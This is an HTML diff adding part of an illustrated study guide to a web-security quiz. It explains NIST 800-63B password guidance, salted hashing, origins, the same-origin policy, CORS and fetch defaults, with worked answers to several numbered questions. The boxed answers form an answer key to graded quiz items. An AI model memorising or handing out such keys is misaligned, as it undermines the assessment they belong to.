+    <text x="350" y="187" font-size="10.6" font-weight="800" fill="#a97800" text-anchor="middle">Why: each extra character MULTIPLIES the number of possibilities</text>
+    <text x="350" y="205" font-size="9.4" fill="#22303f" text-anchor="middle">Adding one character multiplies the search space by the size of the alphabet, again and again.</text>
+    <text x="350" y="220" font-size="9.4" fill="#22303f" text-anchor="middle">Adding symbols only widens the alphabet a little. That is why NIST treats LENGTH as the primary factor,</text>
+    <text x="350" y="230" font-size="1" fill="#fff">.</text>
+    <text x="350" y="231" font-size="9.4" font-weight="700" fill="#a97800" text-anchor="middle">and why forcing symbols mostly just makes users write passwords on sticky notes.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 2.1</span> &ndash; The modern consensus, and the exact opposite of what option D of Q2 claims.</figcaption>
+</figure>
+
+<h2>2.2 Salting and hashing</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the one-way mincer</span>
+  A <b>hash</b> is a mincing machine. Put a password in, get mince out. You can always mince the
+  same password and get the same mince, so you can <b>check</b> a login &ndash; but you can never
+  turn mince back into meat. That is why the server never needs to store your actual password.
+  <br/><br/>
+  Problem: everybody who picks <code>password123</code> produces <b>identical mince</b>, so one
+  lookup table cracks thousands of accounts at once.
+  <br/><br/>
+  Solution: before mincing, add a unique pinch of <b>salt</b> for each user &ndash; a random value
+  stored alongside. Now two people with the same password produce completely different mince,
+  and precomputed tables are useless.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 215" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="s1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#5b3ec8"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">How a password should be stored</text>
+
+    <rect x="14" y="34" width="100" height="42" rx="7" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2"/>
+    <text x="64" y="52" font-size="8.8" font-weight="700" fill="#1b4f9c" text-anchor="middle">the password</text>
+    <text x="64" y="67" font-size="8.4" fill="#22303f" text-anchor="middle">"mangoes123"</text>
+
+    <text x="140" y="46" font-size="14" font-weight="800" fill="#5b3ec8" text-anchor="middle">+</text>
+
+    <rect x="164" y="34" width="112" height="42" rx="7" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="2"/>
+    <text x="220" y="49" font-size="8.8" font-weight="700" fill="#5b3ec8" text-anchor="middle">a random SALT</text>
+    <text x="220" y="62" font-size="8.4" fill="#22303f" text-anchor="middle">unique per user,</text>
+    <text x="220" y="73" font-size="8.4" font-weight="700" fill="#5b3ec8" text-anchor="middle">at least 32 bits</text>
+
+    <path d="M282 55 H326" stroke="#5b3ec8" stroke-width="2.2" marker-end="url(#s1)"/>
+
+    <rect x="332" y="34" width="112" height="42" rx="7" fill="#fff1e6" stroke="#d9480f" stroke-width="2"/>
+    <text x="388" y="49" font-size="8.8" font-weight="700" fill="#d9480f" text-anchor="middle">HASH FUNCTION</text>
+    <text x="388" y="62" font-size="8.4" fill="#22303f" text-anchor="middle">slow and one-way,</text>
+    <text x="388" y="73" font-size="8.4" fill="#22303f" text-anchor="middle">many iterations</text>
+
+    <path d="M450 55 H494" stroke="#5b3ec8" stroke-width="2.2" marker-end="url(#s1)"/>
+
+    <rect x="500" y="34" width="186" height="42" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+    <text x="593" y="49" font-size="8.8" font-weight="700" fill="#1f7a3a" text-anchor="middle">stored in the database</text>
+    <text x="593" y="63" font-size="8" fill="#22303f" text-anchor="middle">salt + hash, never the password</text>
+    <text x="593" y="73" font-size="8" fill="#1f7a3a" font-weight="700" text-anchor="middle">cannot be reversed</text>
+
+    <!-- salt effect -->
+    <rect x="14" y="92" width="672" height="66" rx="8" fill="#f7f9fc" stroke="#9aa4b2" stroke-width="1.8"/>
+    <text x="350" y="110" font-size="10.4" font-weight="800" fill="#5a6472" text-anchor="middle">What the salt buys you</text>
+    <text x="30" y="128" font-size="9" font-weight="700" fill="#b52020">Without salt:</text>
+    <text x="128" y="128" font-size="9" fill="#22303f">Ravi and Sita both pick "mangoes123"  ->  identical stored hash  ->  crack one, crack both</text>
+    <text x="30" y="148" font-size="9" font-weight="700" fill="#1f7a3a">With salt:</text>
+    <text x="128" y="148" font-size="9" fill="#22303f">same password, different salts  ->  completely different hashes  ->  each must be attacked alone</text>
+
+    <rect x="14" y="168" width="672" height="40" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+    <text x="350" y="186" font-size="9.8" font-weight="800" fill="#b52020" text-anchor="middle">Important wording for exams: passwords are HASHED, not ENCRYPTED.</text>
+    <text x="350" y="201" font-size="9.2" fill="#22303f" text-anchor="middle">Encryption can be reversed with a key. Hashing cannot be reversed at all. So "decrypting a password" is not a thing.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 2.2</span> &ndash; Salted, slow hashing. NIST requires the salt to be at least <b>32 bits</b>.</figcaption>
+</figure>
+
+<h2>2.3 The NIST 800-63B rules, and the myths it retired</h2>
+
+<figure>
+  <svg viewBox="0 0 700 230" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">NIST SP 800-63B: what it says, and what it stopped saying</text>
+
+    <rect x="8" y="28" width="336" height="196" rx="10" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.5"/>
+    <text x="176" y="48" font-size="11" font-weight="800" fill="#1f7a3a" text-anchor="middle">NIST DOES recommend</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="24" y="70">&bull; <tspan font-weight="700">length as the main strength factor</tspan></text>
+      <text x="34" y="82">at least 8 characters, allow up to 64</text>
+      <text x="24" y="100">&bull; <tspan font-weight="700">salted, slow hashing</tspan> before storage,</text>
+      <text x="34" y="112">with a salt of at least 32 bits</text>
+      <text x="24" y="130">&bull; <tspan font-weight="700">limit failed login attempts</tspan> and</text>
+      <text x="34" y="142">throttle or lock after too many</text>
+      <text x="24" y="160">&bull; <tspan font-weight="700">check new passwords against lists</tspan></text>
+      <text x="34" y="172">of known breached passwords</text>
+      <text x="24" y="190">&bull; allow spaces, and allow paste, so</text>
+      <text x="34" y="202">password managers work</text>
+      <text x="24" y="218" font-weight="700" fill="#1f7a3a">Q2 options A, B and C all live here</text>
+    </g>
+
+    <rect x="356" y="28" width="336" height="196" rx="10" fill="#fdecec" stroke="#b52020" stroke-width="2.5"/>
+    <text x="524" y="48" font-size="11" font-weight="800" fill="#b52020" text-anchor="middle">NIST does NOT recommend</text>
+    <g font-size="8.8" fill="#22303f">
+      <text x="372" y="70">&bull; <tspan font-weight="700">forcing periodic password resets</tspan></text>
+      <text x="382" y="82">users just add "1", "2", "3" to the end</text>
+      <text x="372" y="100">&bull; <tspan font-weight="700">demanding symbols and mixed case</tspan></text>
+      <text x="382" y="112">it hurts memorability more than it helps</text>
+      <text x="372" y="130">&bull; <tspan font-weight="700">preferring complexity over length</tspan></text>
+      <text x="382" y="142">this is exactly backwards</text>
+      <text x="372" y="160">&bull; password hints and knowledge</text>
+      <text x="382" y="172">questions like "mother's maiden name"</text>
+      <text x="372" y="190">&bull; SMS as a strong second factor</text>
+      <text x="382" y="202">(it is discouraged, not banned)</text>
+      <text x="372" y="218" font-weight="700" fill="#b52020">Q2 option D lives here</text>
+    </g>
+  </svg>
+  <figcaption><span class="fignum">Figure 2.3</span> &ndash; The left column is modern guidance; the right column is the folklore it replaced.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q2 ---------------------------- -->
+<div class="qhead">Question 2 <span class="mark">1 mark &bull; single correct</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following does <b>not</b> come under the guidelines released by NIST Special Publications 800-63B?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> The users should not be asked to reset their passwords after every certain period.</li>
+    <li class="wrong"><span class="lab">B.</span> The number of attempts to log in into an account should be made limited before locking the amount.</li>
+    <li class="wrong"><span class="lab">C.</span> The passwords should be hash with at least a 32-bit salt data before storing them in the database.</li>
+    <li class="right"><span class="lab">D.</span> The users should choose a complex password over a lengthy password, as a complex password can be easily decrypted compared to a lengthy password.</li>
+  </ul>
+</div>
+
+<div class="warn">
+  <span class="boxtitle">Read the instruction twice</span>
+  The question asks which one is <b>not</b> a guideline. So three options <i>are</i> genuine NIST
+  advice, and you must tick the odd one out.
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:96px" class="c">Is it NIST advice?</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">YES</span></td>
+      <td>This is one of the most famous changes NIST made. Forced periodic resets are
+      <b>discouraged</b>, because users respond by making tiny predictable edits
+      (<code>Summer2023</code> becomes <code>Summer2024</code>), which reduces security rather than
+      improving it. Reset only when there is evidence of compromise.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">YES</span></td>
+      <td>Limiting failed login attempts is standard NIST guidance &ndash; it is what stops
+      <b>brute-force</b> and <b>credential-stuffing</b> attacks. (The phrase "locking the amount"
+      is a typo for "locking the account".)</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">YES</span></td>
+      <td>Salted hashing before storage is required, and NIST specifies the salt shall be
+      <b>at least 32 bits</b> in length. Figure 2.2. The specific number in this option is what
+      makes it identifiable as genuine NIST wording.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">NO</span><br/><small>the answer</small></td>
+      <td><b>Wrong twice over.</b>
+      <br/>(1) NIST treats <b>length</b> as the primary strength factor, so preferring complexity
+      <i>over</i> length is the opposite of the guidance.
+      <br/>(2) The reason given is nonsense: passwords are <b>hashed, not encrypted</b>, so
+      nothing about them is "decrypted" &ndash; and even if it were, a complex password being
+      <i>easier</i> to break makes no sense as an argument for choosing it.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 2</span>
+  <span class="big">Option D</span>
+  <br/><small>Length beats complexity, and passwords are hashed rather than decrypted.
+  Matches your selection.</small>
+</div>
+
+<div class="kid">
+  <span class="boxtitle">A shortcut for this question type</span>
+  You did not even need to know NIST to answer it. Option D contains a
+  <b>factual impossibility</b> &ndash; "a complex password can be easily decrypted" &ndash; and an
+  option that is internally illogical cannot be anybody's official guideline. When one option
+  contains a broken claim, it is almost always the answer.
+</div>
+
+
+<!-- ============================== PART 3 ============================== -->
+<h1 class="part"><span class="kicker">Part 3 &bull; Question 10</span>Origins, the same-origin policy and CORS</h1>
+
+<p>Three of the ten questions touch CORS, so the idea of an <b>origin</b> is worth getting exactly
+right. It is a precise, mechanical definition &ndash; no judgement involved.</p>
+
+<h2>3.1 What is an origin?</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the postal address</span>
+  Two letters come from the "same address" only if the <b>street</b>, the <b>house number</b>
+  and the <b>city</b> all match. If any one of the three differs, it is a different address &ndash;
+  even if the family name is the same.
+  <br/><br/>
+  An <b>origin</b> is exactly that kind of triple. Three parts must all match:
+  the <b>scheme</b>, the <b>host</b> and the <b>port</b>. Anything after that &ndash; the path,
+  the query string, the fragment &ndash; is <b>irrelevant</b>.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 215" xmlns="http://www.w3.org/2000/svg">
+    <rect x="70" y="18" width="560" height="42" rx="7" fill="#1e2430"/>
+    <text x="88" y="46" font-size="16" fill="#c792ea" font-weight="700">https://</text>
+    <text x="184" y="46" font-size="16" fill="#7fd1b9" font-weight="700">shop.example.com</text>
+    <text x="386" y="46" font-size="16" fill="#ffcb6b" font-weight="700">:443</text>
+    <text x="440" y="46" font-size="16" fill="#8b98ad" font-weight="700">/cart/item?id=7</text>
+
+    <path d="M112 64 L94 84" stroke="#c792ea" stroke-width="2" fill="none"/>
+    <path d="M256 64 L260 84" stroke="#7fd1b9" stroke-width="2" fill="none"/>
+    <path d="M402 64 L426 84" stroke="#ffcb6b" stroke-width="2" fill="none"/>
+    <path d="M500 64 L599 84" stroke="#8b98ad" stroke-width="2" fill="none"/>
+
+    <rect x="14" y="86" width="160" height="80" rx="7" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="2"/>
+    <text x="94" y="104" font-size="9.6" font-weight="800" fill="#5b3ec8" text-anchor="middle">SCHEME</text>
+    <text x="94" y="122" font-size="8.6" fill="#22303f" text-anchor="middle">https</text>
+    <rect x="26" y="132" width="136" height="20" rx="10" fill="#5b3ec8"/>
+    <text x="94" y="146" font-size="8.4" font-weight="700" fill="#fff" text-anchor="middle">PART OF THE ORIGIN</text>
+    <text x="94" y="161" font-size="8" fill="#5a6472" text-anchor="middle">http and https differ</text>
+
+    <rect x="180" y="86" width="160" height="80" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+    <text x="260" y="104" font-size="9.6" font-weight="800" fill="#1f7a3a" text-anchor="middle">HOST</text>
+    <text x="260" y="122" font-size="8.6" fill="#22303f" text-anchor="middle">shop.example.com</text>
+    <rect x="192" y="132" width="136" height="20" rx="10" fill="#1f7a3a"/>
+    <text x="260" y="146" font-size="8.4" font-weight="700" fill="#fff" text-anchor="middle">PART OF THE ORIGIN</text>
+    <text x="260" y="161" font-size="8" fill="#5a6472" text-anchor="middle">a subdomain is a new host</text>
+
+    <rect x="346" y="86" width="160" height="80" rx="7" fill="#fff1e6" stroke="#d9480f" stroke-width="2"/>
+    <text x="426" y="104" font-size="9.6" font-weight="800" fill="#d9480f" text-anchor="middle">PORT</text>
+    <text x="426" y="122" font-size="8.6" fill="#22303f" text-anchor="middle">443</text>
+    <rect x="358" y="132" width="136" height="20" rx="10" fill="#d9480f"/>
+    <text x="426" y="146" font-size="8.4" font-weight="700" fill="#fff" text-anchor="middle">PART OF THE ORIGIN</text>
+    <text x="426" y="161" font-size="8" fill="#5a6472" text-anchor="middle">443 is the https default</text>
+
+    <rect x="512" y="86" width="174" height="80" rx="7" fill="#f3f5f9" stroke="#9aa4b2" stroke-width="2"/>
+    <text x="599" y="104" font-size="9.6" font-weight="800" fill="#5a6472" text-anchor="middle">PATH and QUERY</text>
+    <text x="599" y="122" font-size="8.6" fill="#22303f" text-anchor="middle">/cart/item?id=7</text>
+    <rect x="524" y="132" width="150" height="20" rx="10" fill="#b52020"/>
+    <text x="599" y="146" font-size="8.4" font-weight="700" fill="#fff" text-anchor="middle">NOT PART OF THE ORIGIN</text>
+    <text x="599" y="161" font-size="8" fill="#5a6472" text-anchor="middle">ignored completely</text>
+
+    <rect x="70" y="180" width="560" height="26" rx="5" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="1.8"/>
+    <text x="350" y="197" font-size="10.4" font-weight="800" fill="#1b4f9c" text-anchor="middle">ORIGIN = SCHEME + HOST + PORT.  All three must match, and nothing else matters.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 3.1</span> &ndash; The definition of an origin. Memorise the three-part rule and Q10 becomes mechanical.</figcaption>
+</figure>
+
+<h2>3.2 Same origin or not? Worked examples</h2>
+
+<p>Compare each pair against <code>http://example.com</code>, applying the three-part test:</p>
+
+<table>
+  <tr><th style="width:230px">The other URL</th><th class="c" style="width:96px">Same origin?</th><th>Reason</th></tr>
+  <tr><td><code>http://example.com/profile</code></td><td class="c"><span class="pill t">YES</span></td>
+      <td>Scheme, host and port all identical. Only the <b>path</b> differs, and paths are ignored.
+      <b>This is Q10 option D.</b></td></tr>
+  <tr><td><code>http://example.com/a/b?x=1</code></td><td class="c"><span class="pill t">YES</span></td>
+      <td>Deeper path and a query string &ndash; still irrelevant.</td></tr>
+  <tr><td><code>http://api.example.com</code></td><td class="c"><span class="pill f">NO</span></td>
+      <td><b>Different host.</b> A subdomain is a different host, so a different origin.
+      <b>This is Q10 option C, which is therefore false.</b></td></tr>
+  <tr><td><code>https://example.com</code></td><td class="c"><span class="pill f">NO</span></td>
+      <td><b>Different scheme</b> (http vs https). This one surprises people.</td></tr>
+  <tr><td><code>http://example.com:8080</code></td><td class="c"><span class="pill f">NO</span></td>
+      <td><b>Different port</b> (8080 vs the default 80).</td></tr>
+  <tr><td><code>http://example.org</code></td><td class="c"><span class="pill f">NO</span></td>
+      <td>Different host entirely.</td></tr>
+</table>
+
+<div class="trap">
+  <span class="boxtitle">Trap box &bull; the two that catch everyone</span>
+  <b>1. Subdomains are NOT the same origin.</b> <code>example.com</code> and
+  <code>api.example.com</code> are different origins, even though they share a parent domain.
+  <br/><b>2. Paths never matter.</b> <code>example.com</code> and
+  <code>example.com/profile</code> <i>are</i> the same origin.
+  <br/><br/>
+  Notice this is the <b>opposite</b> of how cookies behave. A cookie with
+  <code>domain=example.com</code> <i>is</i> shared with <code>api.example.com</code>, but they are
+  still different <b>origins</b>. Cookie scope and origin are two different rules &ndash; do not
+  merge them.
+</div>
+
+<h2>3.3 The same-origin policy, and how CORS relaxes it</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the locked staff room</span>
+  By default, a browser is very suspicious: <b>a page from one origin may not read data from
+  another origin.</b> Otherwise any dodgy site you visited could quietly read your webmail in
+  another tab.
+  <br/><br/>
+  But some sharing is legitimate. So the <i>receiving</i> server is allowed to put up a notice
+  saying "these particular visitors may come in, using these particular methods".
+  <b>CORS is that notice system.</b> The default remains <b>deny</b>; CORS is how a server
+  chooses to permit specific origins.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 285" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="o1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+      <marker id="o2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#1f7a3a"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Default: blocked. With the server's permission: allowed.</text>
+
+    <!-- blocked -->
+    <rect x="8" y="28" width="336" height="118" rx="9" fill="#fdecec" stroke="#b52020" stroke-width="2.4"/>
+    <text x="176" y="47" font-size="10.6" font-weight="800" fill="#b52020" text-anchor="middle">NO CORS HEADER &ndash; browser blocks the read</text>
+    <rect x="24" y="60" width="86" height="38" rx="6" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="67" y="76" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">page from</text>
+    <text x="67" y="88" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">site-a.com</text>
+    <path d="M116 79 H196" stroke="#b52020" stroke-width="2" marker-end="url(#o1)"/>
+    <text x="156" y="96" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">fetch</text>
+    <line x1="148" y1="70" x2="164" y2="88" stroke="#b52020" stroke-width="3.4"/>
+    <line x1="164" y1="70" x2="148" y2="88" stroke="#b52020" stroke-width="3.4"/>
+    <rect x="202" y="60" width="86" height="38" rx="6" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="245" y="76" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">data at</text>
+    <text x="245" y="88" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">site-b.com</text>
+    <text x="176" y="118" font-size="8.8" fill="#22303f" text-anchor="middle">The request may reach the server, but the</text>
+    <text x="176" y="131" font-size="8.8" fill="#22303f" text-anchor="middle">BROWSER refuses to hand the reply to JavaScript.</text>
+    <text x="176" y="142" font-size="8.4" font-style="italic" fill="#b52020" text-anchor="middle">This is the default. This is what a CORS error in the console means.</text>
+
+    <!-- allowed -->
+    <rect x="356" y="28" width="336" height="118" rx="9" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.4"/>
+    <text x="524" y="47" font-size="10.6" font-weight="800" fill="#1f7a3a" text-anchor="middle">SERVER SENDS A CORS HEADER &ndash; allowed</text>
+    <rect x="372" y="60" width="86" height="38" rx="6" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="415" y="76" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">page from</text>
+    <text x="415" y="88" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">site-a.com</text>
+    <path d="M464 79 H544" stroke="#1f7a3a" stroke-width="2" marker-end="url(#o2)"/>
+    <text x="504" y="72" font-size="7.6" font-weight="700" fill="#1f7a3a" text-anchor="middle">fetch</text>
+    <rect x="550" y="60" width="86" height="38" rx="6" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="593" y="76" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">data at</text>
+    <text x="593" y="88" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">site-b.com</text>
+    <text x="524" y="118" font-size="8.8" fill="#22303f" text-anchor="middle">site-b replies with a header naming who may read it,</text>
+    <text x="524" y="131" font-size="8.8" fill="#22303f" text-anchor="middle">so the browser hands the data over.</text>
+    <text x="524" y="142" font-size="8.4" font-style="italic" fill="#1f7a3a" text-anchor="middle">Permission is granted by the RECEIVING server, never by the caller.</text>
+
+    <!-- headers -->
+    <rect x="8" y="158" width="684" height="120" rx="9" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2.2"/>
+    <text x="350" y="177" font-size="10.6" font-weight="800" fill="#1b4f9c" text-anchor="middle">The CORS headers a server can send &ndash; note what they let it specify</text>
+    <g font-size="8.8">
+      <rect x="24" y="188" width="300" height="24" rx="4" fill="#1e2430"/>
+      <text x="34" y="204" fill="#7fd1b9">Access-Control-Allow-Origin: https://site-a.com</text>
+      <text x="336" y="204" fill="#22303f" font-weight="700">WHICH ORIGINS may read</text>
+
+      <rect x="24" y="216" width="300" height="24" rx="4" fill="#1e2430"/>
+      <text x="34" y="232" fill="#7fd1b9">Access-Control-Allow-Methods: GET, POST</text>
+      <text x="336" y="232" fill="#22303f" font-weight="700">WHICH METHODS are accepted</text>
+
+      <rect x="24" y="244" width="300" height="24" rx="4" fill="#1e2430"/>
+      <text x="34" y="260" fill="#7fd1b9">Access-Control-Allow-Headers: X-CSRFToken</text>
+      <text x="336" y="260" fill="#22303f" font-weight="700">WHICH HEADERS are permitted</text>
+    </g>
+  </svg>
+  <figcaption><span class="fignum">Figure 3.2</span> &ndash; CORS lets a server <b>specify the origins and the request methods it is willing to accept</b> &ndash; the exact wording of Q3 option C.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q10 ---------------------------- -->
+<div class="qhead">Question 10 <span class="mark">1 mark &bull; select all that apply</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following statements is true?</p>
+  <ul class="opts">
+    <li class="right"><span class="lab">A.</span> CORS prevents browsers from loading data from different origins by default.</li>
+    <li class="wrong"><span class="lab">B.</span> CORS prevents browsers from loading data from the same origin by default.</li>
+    <li class="wrong"><span class="lab">C.</span> <code>http://example.com</code> and <code>http://api.example.com</code> have the same origin.</li>
+    <li class="right"><span class="lab">D.</span> <code>http://example.com</code> and <code>http://example.com/profile</code> have the same origin.</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>The default posture for cross-origin reads is <b>deny</b>. A browser will not hand
+      another origin's data to your JavaScript unless that server explicitly permits it.
+      Left panel of Figure 3.2.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Nothing blocks <b>same-origin</b> requests &ndash; a page loading its own data is the
+      normal, always-allowed case. A and B are opposites, so exactly one is right, and this is
+      the wrong one.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td><b>Different host</b>, therefore a different origin. <code>api.example.com</code> is a
+      subdomain, and a subdomain is a separate host. This is precisely why a front end at
+      <code>example.com</code> calling an API at <code>api.example.com</code> needs CORS
+      headers.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>Same scheme (http), same host (example.com), same port (80). Only the <b>path</b>
+      differs, and the path is not part of an origin. Figure 3.1.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 10</span>
+  <span class="big">A and D</span>
+  <br/><small>Cross-origin reads are denied by default, and paths do not affect the origin.
+  Matches your selection.</small>
+</div>
+
+<div class="note">
+  <span class="boxtitle">A precision note on option A, so a nitpicker cannot catch you</span>
+  Strictly speaking, the rule that <i>blocks</i> cross-origin access is called the
+  <b>same-origin policy</b>, and <b>CORS</b> is the mechanism that lets a server <i>relax</i> it.
+  So a purist would say "the same-origin policy prevents it; CORS permits it".
+  <br/><br/>
+  Option A is still the intended and defensible answer, because the two form one system whose
+  <b>default is deny</b>: without a CORS header, the data is not delivered. And option B, its
+  only competitor, is plainly false. If you ever have to write this in a long answer, use the
+  precise version: <i>"the same-origin policy blocks cross-origin reads by default; CORS is how a
+  server opts in to allowing them."</i>
+</div>
+
+
+<!-- ============================== PART 4 ============================== -->
+<h1 class="part"><span class="kicker">Part 4 &bull; Question 4</span>The fetch API in detail</h1>
+
+<p><code>fetch</code> is how JavaScript makes HTTP requests. Two of the questions test its
+default settings, so let us look at the options object properly.</p>
+
+<figure>
+  <svg viewBox="0 0 700 250" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">The fetch options object, and what each setting controls</text>
+
+    <rect x="14" y="26" width="330" height="128" rx="7" fill="#1e2430"/>
+    <g font-size="8.6">
+      <text x="28" y="44" fill="#82aaff">fetch(</text>
+      <text x="70" y="44" fill="#ffcb6b">'/api/data'</text>
+      <text x="140" y="44" fill="#e6e9ef">, {</text>
+      <text x="40" y="60" fill="#c792ea">method:</text>
+      <text x="96" y="60" fill="#ffcb6b">'POST'</text>
+      <text x="140" y="60" fill="#8b98ad">// default is GET</text>
+      <text x="40" y="76" fill="#c792ea">mode:</text>
+      <text x="82" y="76" fill="#ffcb6b">'cors'</text>
+      <text x="128" y="76" fill="#8b98ad">// this IS the default</text>
+      <text x="40" y="92" fill="#c792ea">credentials:</text>
+      <text x="126" y="92" fill="#ffcb6b">'include'</text>
+      <text x="188" y="92" fill="#8b98ad">// cookies</text>
+      <text x="40" y="108" fill="#c792ea">headers:</text>
+      <text x="104" y="108" fill="#e6e9ef">{ ... },</text>
+      <text x="40" y="124" fill="#c792ea">body:</text>
+      <text x="82" y="124" fill="#e6e9ef">JSON.stringify(x)</text>
+      <text x="28" y="142" fill="#e6e9ef">})</text>
+    </g>
+
+    <g font-size="8.8">
+      <rect x="356" y="34" width="336" height="30" rx="5" fill="#e8f0fb" stroke="#1b4f9c"/>
+      <text x="366" y="47" font-weight="800" fill="#1b4f9c">method</text>
+      <text x="430" y="47" fill="#22303f">GET, POST, PUT, DELETE, HEAD ...</text>
+      <text x="366" y="59" font-weight="700" fill="#b52020">the default is GET, never HEAD</text>
+
+      <rect x="356" y="70" width="336" height="30" rx="5" fill="#f0ecfd" stroke="#5b3ec8"/>
+      <text x="366" y="83" font-weight="800" fill="#5b3ec8">mode</text>
+      <text x="430" y="83" fill="#22303f">cors, no-cors, same-origin</text>
+      <text x="366" y="95" font-weight="700" fill="#5b3ec8">the default is cors, which permits cross-origin calls</text>
+
+      <rect x="356" y="106" width="336" height="30" rx="5" fill="#e9f7ee" stroke="#1f7a3a"/>
+      <text x="366" y="119" font-weight="800" fill="#1f7a3a">credentials</text>
+      <text x="446" y="119" fill="#22303f">omit, same-origin, include</text>
+      <text x="366" y="131" font-weight="700" fill="#1f7a3a">this is how you control whether COOKIES are sent</text>
+
+      <rect x="356" y="142" width="336" height="30" rx="5" fill="#fff1e6" stroke="#d9480f"/>
+      <text x="366" y="155" font-weight="800" fill="#d9480f">headers / body</text>
+      <text x="456" y="155" fill="#22303f">what you send along with it</text>
+      <text x="366" y="167" fill="#22303f">e.g. Content-Type, or a CSRF token header</text>
+    </g>
+
+    <rect x="14" y="182" width="678" height="60" rx="8" fill="#fffbe8" stroke="#e0a800" stroke-width="2"/>
+    <text x="353" y="200" font-size="10.4" font-weight="800" fill="#a97800" text-anchor="middle">The three defaults worth memorising</text>
+    <text x="353" y="218" font-size="9.4" fill="#22303f" text-anchor="middle">method: <tspan font-weight="800">GET</tspan>     &bull;     mode: <tspan font-weight="800">cors</tspan>     &bull;     credentials: <tspan font-weight="800">same-origin</tspan></text>
+    <text x="353" y="234" font-size="9.2" fill="#22303f" text-anchor="middle">Exam questions about fetch almost always attack one of these three.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 4.1</span> &ndash; The options object. Note that <code>credentials</code> is exactly the cookie control that Q4 option C describes.</figcaption>
+</figure>
+
+<h2>4.1 The three modes, and what "opaque" means</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the sealed envelope</span>
+  You ask a courier to collect a document from a stranger's office. Three possible arrangements:
+  <br/><br/>
+  <b>cors</b> &ndash; the courier may collect it, but only if the office has your name on its
+  approved list. If it does, you can open and read the document.
+  <br/><br/>
+  <b>no-cors</b> &ndash; the courier collects it and hands you a <b>sealed envelope you are not
+  allowed to open</b>. You know delivery happened; you cannot read a single word. That sealed
+  envelope is an <b>opaque</b> response.
+  <br/><br/>
+  <b>same-origin</b> &ndash; the courier refuses to leave your own building at all.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 235" xmlns="http://www.w3.org/2000/svg">
